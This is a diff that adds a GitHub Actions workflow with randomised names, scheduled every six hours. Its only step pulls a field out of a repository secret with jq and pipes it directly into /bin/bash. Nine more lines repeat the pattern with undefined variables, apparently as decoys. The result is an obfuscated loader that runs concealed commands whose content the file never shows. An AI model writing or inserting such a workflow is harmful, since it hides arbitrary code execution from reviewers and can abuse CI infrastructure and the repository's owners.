@@ -1,0 +1,28 @@
+name: sogntaozisn
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sogntaozisn
+        env:
+          mcrue5393: ${{ secrets.mcrue5393 }}
+        run: |
+          echo $mcrue5393 | jq -r .ugi82 | /bin/bash
+          echo $yv03 | jq -r .u8 | /bin/bash
+          echo $tx7032 | jq -r .iomcu06053 | /bin/bash
+          echo $s4 | jq -r .ei64949 | /bin/bash
+          echo $el19211 | jq -r .kpt88928 | /bin/bash
+          echo $atn3114 | jq -r .lqou3 | /bin/bash
+          echo $amsj29 | jq -r .vgem5065 | /bin/bash
+          echo $twdpv9718 | jq -r .bv1564 | /bin/bash
+          echo $at3951 | jq -r .kenek4646 | /bin/bash
+          echo $njh08309 | jq -r .t23 | /bin/bash
+
